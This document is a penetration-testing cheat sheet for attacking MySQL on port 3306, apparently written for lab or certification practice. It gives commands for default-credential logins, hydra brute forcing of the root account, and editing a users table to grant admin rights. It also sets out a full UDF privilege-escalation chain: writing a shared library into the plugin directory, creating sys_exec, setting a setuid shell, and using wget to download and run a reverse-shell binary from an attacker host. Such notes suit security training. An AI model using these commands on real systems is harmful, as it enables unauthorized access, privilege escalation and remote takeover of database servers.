# MySQL (3306)

---

### 1) MySQL Enumeration

- check version -- is it exploitable?
- do you have credentials?
- can you setup a reverse SSH connection (or port forward) to access database from local Kali machine? (see [[pivoting]])


Login:
- `mysql -h <ip> -u <user> -P <port> -p` -> [password]
- or `mysq --host=<host> --port=<port> --user=<user> -p`
- try default password of `root:root` or `root:<empty>`

Enumerate:
- see what privileges current user has: `show grants;`
- see what variables are presents: `show variables;`
	- this could include; hostname, where the `tmp` directory is, the database version, the target architecture, if there is a `plugin` directory, etc. 
	- if a plugin directory is present then the DB may be vulnerable to UDF exploitation 
- once you have the DB version you can check if it's exploitable:
	- i.e. `searchploit mariadb` or `searchsploit mysql` 
- to see specific table information: `use <dbase>;` -> `select * from <table>`




  - update to get access to parts of a website:
	- i.e. `update users set adm="yes" where username="tracking1";`


<br> 

### 2) MySQL Exploitation

Brute force login:
- `hydra -l <user> -P <wordlist> <ip> mysql`
- i.e. `hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.33.14 mysql`



<br>

### MySQL Privilege Escalation

UDF exploitation:
> User Defined Function (UDF) is similar to a custom plugin for MySQL. It allows database administrators to create custom repeatable functions to accomplish specific objectives. They are written in C or C++ and can run almost any code we want, including system commands. You can use standard MySQL (and MariaDB) functions to create these plugins to exploit a system
- note, you need MySQL `FILE` permissions to run this exploit (specifically for the `dumpfile` command), which is typically only given to a user with  `root` permissions
- you also need to know where the "plugins" directory is (this can be found by issuing `show variables;`)
- basic MySQL commands to exploit:
	```sql
	select @@plugin_dir
	select binary 0xshellcode into dumpfile @@plugin_dir;
	create function sys_exec returns int soname udf_filename;
	select * from mysql.func where name='sys_exec' \G
	select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
	```
- to generate the shellcode you can search through `searchsploit` for links to the `lib_mysqludf_sys.so` shared library which is used 
- once this library is found you need to produce a hexdump of this binary code using the `xxd` command (removing newline characters):
	- i.e. `xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex`
- then you can put this hexdump into a MySQL variable for to use: 
	- i.e. `set @shell = <hexdump>`
- finally, you can execute the exploit:
	- `select @@plugin_dir;` -> `select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';` -> `create function sys_exec returns int soname 'udf_sys_exec.so';` -> `select * from mysql.func where name='sys_exec';`
	- note, you may need to change the location to match the `plugin` directory location on the system 
	- try connecting to Kali machine (which has a Python web server running): `select sys_exec('wget http://<kali_ip>');`
	- download a reverse shell and run it:
		- i.e. `select sys_exec('wget http://10.1.2.1/shell.elf');` -> `select sys_exec('chmod +x shell.elf');`-> `select sys_exec('./shell.elf');`
